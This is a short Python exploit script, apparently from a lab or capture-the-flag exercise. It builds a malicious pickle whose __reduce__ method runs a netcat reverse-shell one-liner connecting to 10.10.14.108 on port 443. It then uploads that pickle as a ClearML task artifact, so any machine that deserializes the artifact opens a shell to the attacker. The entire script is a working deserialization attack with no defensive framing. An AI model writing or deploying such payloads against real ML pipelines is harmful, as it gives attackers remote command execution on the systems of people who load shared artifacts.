import pickle
import os
from clearml import Task, Logger


task = Task.init(project_name='Black Swan', task_name='REV shell', tags=["review"])



class MaliciousCode:
    def __reduce__(self):

        cmd = (
            "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.108 443 > /tmp/f"
        )
        return (os.system, (cmd,))

malicious_object = MaliciousCode()
pickle_filename = 'malicious_pickle.pkl'
with open(pickle_filename, 'wb') as f:
    pickle.dump(malicious_object, f)

print("Malicious pickle file with reverse shell created.")


task.upload_artifact(name='malicious_pickle', artifact_object=malicious_object, retries=2, wait_on_upload=True, extension_name=".pkl")

print("Malicious pickle file uploaded as artifact.")